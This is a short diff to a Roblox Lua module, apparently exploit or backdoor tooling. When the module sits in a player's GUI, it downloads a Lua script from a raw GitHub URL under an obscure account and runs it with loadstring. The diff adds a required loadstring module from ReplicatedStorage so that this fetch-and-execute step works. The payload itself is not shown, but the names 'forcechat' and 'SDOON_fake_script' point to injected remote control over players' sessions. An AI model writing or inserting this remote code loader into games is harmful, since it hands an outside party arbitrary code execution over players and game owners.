@@ -32,6 +32,7 @@ function module:init(exec, execute2, main, title, buttons, execute, shadow, clea
             if exec.Parent then
                 if exec.Parent:IsA("PlayerGui") then
                     if not exec.Parent:FindFirstChild("forcechat") then
+                        local loadstring = require(game:GetService("ReplicatedStorage"):WaitForChild("loadstring", 99999))
                         local fcmain = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/fc/u.lua", true))()
 
 		                fcmain:init(exec.Parent.Parent)
@@ -41,7 +42,7 @@ function module:init(exec, execute2, main, title, buttons, execute, shadow, clea
         end)
     end
     coroutine.wrap(SDOON_fake_script)()
-    
+
 end
 
 return module
